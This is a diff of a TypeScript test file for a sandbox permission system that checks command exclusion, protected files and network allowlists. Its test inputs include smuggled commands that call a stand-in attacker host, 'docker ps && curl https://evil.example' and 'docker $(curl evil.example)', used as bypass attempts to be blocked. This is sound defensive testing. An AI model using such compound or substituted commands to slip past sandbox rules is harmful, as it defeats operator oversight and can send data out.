@@ -66,10 +66,7 @@ async function main(): Promise<void> {
     !containsExcludedCommand("docker ps && curl https://evil.example", ["docker:*"]),
     "mixed compound command cannot bypass",
   );
-  assert(
-    !containsExcludedCommand("docker ps && docker images", ["docker:*"]),
-    "compound commands never bypass",
-  );
+  assert(!containsExcludedCommand("docker ps && docker images", ["docker:*"]), "compound commands never bypass");
   assert(!containsExcludedCommand("docker $(curl evil.example)", ["docker:*"]), "command substitution never bypasses");
 
   section("[2] settings merge and validation");
@@ -151,7 +148,11 @@ async function main(): Promise<void> {
   assert(profile.filesystem.denyWrite.includes(path.join(cwd, ".mcp.json")), ".mcp.json cannot be rewritten");
 
   const runtime = toSandboxRuntimeConfig(profile);
-  assertEqual(runtime.network.allowedDomains, profile.network.allowedDomains, "runtime receives exact domain allowlist");
+  assertEqual(
+    runtime.network.allowedDomains,
+    profile.network.allowedDomains,
+    "runtime receives exact domain allowlist",
+  );
   assertEqual(runtime.network.deniedDomains, profile.network.deniedDomains, "runtime receives exact domain denylist");
   assertEqual(runtime.filesystem.denyRead, profile.filesystem.denyRead, "runtime receives denyRead");
   assertEqual(runtime.network.strictAllowlist, true, "a configured allowlist denies unmatched destinations");
